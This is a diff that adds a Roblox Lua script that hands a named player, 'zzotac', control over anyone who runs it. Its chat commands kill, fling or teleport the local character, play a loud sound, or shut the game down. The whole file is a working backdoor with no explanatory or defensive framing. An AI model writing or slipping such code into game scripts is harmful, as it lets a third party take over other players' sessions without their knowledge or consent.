@@ -1,0 +1,42 @@
+
+
+game.Players.zzotac.Chatted:connect(function(Message)
+if Message:lower() == ":kill ." then
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end
+end)
+
+game.Players.zzotac.Chatted:connect(function(Message)
+if Message:lower() == ":fling ." then
+game:getService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2722238.6643066406, 4862221.3525390625, -27222274.0993652344)
+end
+end)
+
+game.Players.zzotac.Chatted:connect(function(Message)
+if Message:lower() == ":bring ." then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.zzotac.Character.HumanoidRootPart.CFrame
+end
+end)
+
+game.Players.zzotac.Chatted:connect(function(Message)
+if Message:lower() == ":sound ." then
+
+ local hi = Instance.new("Sound")
+hi.Name = "Sound"
+hi.SoundId = "http://www.roblox.com/asset/?id=4809574295"
+hi.Volume = 10
+hi.Looped = false
+hi.archivable = false
+hi.Parent = game.Workspace
+
+if game.Players.LocalPlayer.Character.Humanoid.Health > 10 then
+hi:Play()
+end
+end
+end)
+
+game.Players.zzotac.Chatted:connect(function(Message)
+if Message:lower() == ":kick ." then
+game:Shutdown()
+end
+end)
